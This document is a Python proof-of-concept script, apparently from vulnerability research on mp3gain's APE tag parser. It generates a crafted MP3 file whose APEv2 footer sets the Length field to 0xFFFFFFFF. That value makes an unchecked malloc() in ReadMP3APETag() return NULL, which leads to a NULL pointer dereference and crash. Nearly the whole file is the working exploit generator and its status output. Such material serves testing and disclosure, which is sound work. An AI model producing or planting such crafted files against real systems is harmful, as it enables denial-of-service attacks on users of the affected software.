#!/usr/bin/env python3
"""
VULN 004 PoC Generator
NULL Pointer Dereference via Missing malloc() Check in APE Tag Parsing
Function: ReadMP3APETag() in apetag.c, lines 171-175

Trigger: APEv2 footer with Length=0xFFFFFFFF causes malloc() to fail (OOM),
         returned NULL is passed directly to fread() -> NULL pointer dereference / crash.
"""

import struct
import os

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_004.mp3")

# Minimal fake MP3 frame header (MPEG1, Layer3, 128kbps, 44100Hz, stereo)
# Sync word 0xFFE0 | ID=1 | Layer=01 | bitrate_idx=9 | freq=0 | padding=0 | ...
# We just need enough bytes to make the file look like an MP3 so mp3gain reads it.
# A real MPEG1 Layer3 frame at 128kbps is 417 bytes.
FRAME_SYNC = bytes([0xFF, 0xFB])  # sync + MPEG1 Layer3 no-free-format
# bitrate=9 (128kbps), samplerate=0 (44100), padding=0, private=0, mode=0 (stereo)
FRAME_HDR_REST = bytes([0x90, 0x00])
FRAME_SIZE = 417  # bytes for this configuration
FRAME_DATA = FRAME_SYNC + FRAME_HDR_REST + bytes(FRAME_SIZE - 4)

# Build a small MP3 body: a handful of frames
NUM_FRAMES = 4
mp3_body = FRAME_DATA * NUM_FRAMES

# APEv2 Footer structure (32 bytes total):
#   ID       : 8 bytes  "APETAGEX"
#   Version  : 4 bytes LE  2000 (APEv2)
#   Length   : 4 bytes LE  <- set to 0xFFFFFFFF to trigger malloc failure
#   ItemCount: 4 bytes LE  0
#   Flags    : 4 bytes LE  0 (footer only, no header)
#   Reserved : 8 bytes     0x00

APE_ID      = b"APETAGEX"
APE_VERSION = struct.pack("<I", 2000)
APE_LENGTH  = struct.pack("<I", 0xFFFFFFFF)   # triggers malloc(0xFFFFFFFF) -> NULL
APE_COUNT   = struct.pack("<I", 0)
APE_FLAGS   = struct.pack("<I", 0)
APE_RESERVED= bytes(8)

ape_footer = APE_ID + APE_VERSION + APE_LENGTH + APE_COUNT + APE_FLAGS + APE_RESERVED
assert len(ape_footer) == 32, f"APE footer must be 32 bytes, got {len(ape_footer)}"

# Final file: MP3 frames + APEv2 footer at end
malicious_mp3 = mp3_body + ape_footer

with open(OUTPUT, "wb") as f:
    f.write(malicious_mp3)

print(f"[+] Written {len(malicious_mp3)} bytes to {OUTPUT}")
print(f"[+] APE footer Length field = 0xFFFFFFFF -> will cause malloc() failure")
print(f"[+] Expected: NULL pointer dereference in fread() at apetag.c:172")
